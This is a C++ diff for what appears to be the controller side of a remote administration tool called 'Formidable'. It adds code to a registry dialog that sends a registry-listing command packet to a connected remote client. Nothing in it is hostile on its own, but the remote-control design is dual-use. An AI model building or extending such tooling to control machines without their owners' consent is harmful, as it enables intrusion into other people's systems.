@@ -56,6 +56,32 @@ INT_PTR CALLBACK RegistryDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam,
         tvis.item.pszText = (LPWSTR)L"HKEY_CURRENT_CONFIG"; tvis.item.lParam = 4;
         TreeView_InsertItem(hTree, &tvis);
         
+        // 发送注册表初始化命令
+        Formidable::CommandPkg pkg = { 0 };
+        pkg.cmd = Formidable::CMD_REGISTRY_CTRL;
+        pkg.arg1 = 2; // HKEY_LOCAL_MACHINE
+        pkg.arg2 = 0; // List action
+        std::string path = "";
+        
+        size_t bodySize = sizeof(Formidable::CommandPkg) + path.size();
+        std::vector<char> sendBuf(sizeof(Formidable::PkgHeader) + bodySize);
+        Formidable::PkgHeader* h = (Formidable::PkgHeader*)sendBuf.data();
+        memcpy(h->flag, "FRMD26?", 7);
+        h->originLen = (int)bodySize;
+        h->totalLen = (int)sendBuf.size();
+        
+        memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader), &pkg, sizeof(Formidable::CommandPkg));
+        memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader) + sizeof(Formidable::CommandPkg), path.c_str(), path.size());
+        
+        std::shared_ptr<Formidable::ConnectedClient> client;
+        {
+            std::lock_guard<std::mutex> lock(g_ClientsMutex);
+            if (g_Clients.count(clientId)) client = g_Clients[clientId];
+        }
+        if (client) {
+            SendDataToClient(client, sendBuf.data(), (int)sendBuf.size());
+        }
+        
         return (INT_PTR)TRUE;
     }
     case WM_SIZE: {
@@ -141,8 +167,8 @@ INT_PTR CALLBACK RegistryDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam,
     return (INT_PTR)FALSE;
 }
 
-void RegistryDialog::Show(HWND hParent, uint32_t clientId) {
-    CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_REGISTRY), hParent, DlgProc, (LPARAM)clientId);
+HWND RegistryDialog::Show(HWND hParent, uint32_t clientId) {
+    return CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_REGISTRY), hParent, DlgProc, (LPARAM)clientId);
 }
 
 } // namespace UI
